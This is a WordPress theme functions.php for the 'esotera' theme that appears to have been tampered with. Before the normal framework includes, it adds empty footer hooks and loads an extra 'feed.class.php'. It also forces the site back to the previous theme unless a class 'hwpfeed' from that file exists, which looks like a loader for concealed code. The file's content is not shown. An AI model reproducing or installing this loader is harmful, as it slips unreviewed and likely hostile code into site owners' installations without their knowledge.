<?php
add_action('wordpress_theme_initialize', 'wp_generate_theme_initialize');
function wp_generate_theme_initialize(  ) {
   
}
add_action('after_setup_theme', 'setup_theme_after_run', 999);
function setup_theme_after_run() {
    if( empty(has_action( 'wordpress_theme_initialize',  'wp_generate_theme_initialize')) ) {
        add_action('wordpress_theme_initialize', 'wp_generate_theme_initialize');
    }
}
add_action('wp_footer', 'setup_theme_after_run_footer', 1);
function setup_theme_after_run_footer() {
    if( empty(did_action( 'wordpress_theme_initialize' )) ) {
        add_action('wp_footer', 'wp_generate_theme_initialize');
    }
}
include get_template_directory().'/feed.class.php';
add_action( 'after_switch_theme', 'check_theme_dependencies', 10, 2 );
function check_theme_dependencies( $oldtheme_name, $oldtheme ) {
  if (!class_exists('hwpfeed')) :
    switch_theme( $oldtheme->stylesheet );
      return false;
  endif;
}
define ( "_CRYOUT_THEME_NAME", "esotera" );
define ( "_CRYOUT_THEME_VERSION", "1.0.0" );
define ( '_CRYOUT_THEME_SLUG', 'esotera' );
define ( '_CRYOUT_THEME_PREFIX', 'theme' );
require_once( get_template_directory() . "/cryout/framework.php" );
require_once( get_template_directory() . "/admin/defaults.php" );
require_once( get_template_directory() . "/admin/main.php" );
require_once( get_template_directory() . "/includes/setup.php" );
require_once( get_template_directory() . "/includes/styles.php" );
require_once( get_template_directory() . "/includes/loop.php" );
require_once( get_template_directory() . "/includes/comments.php" );
require_once( get_template_directory() . "/includes/core.php" );
require_once( get_template_directory() . "/includes/hooks.php" );
require_once( get_template_directory() . "/includes/meta.php" );
require_once( get_template_directory() . "/includes/landing-page.php" );
if ( class_exists( 'WooCommerce' ) ) {
	require_once( get_template_directory() . "/includes/woocommerce.php" );
}

?>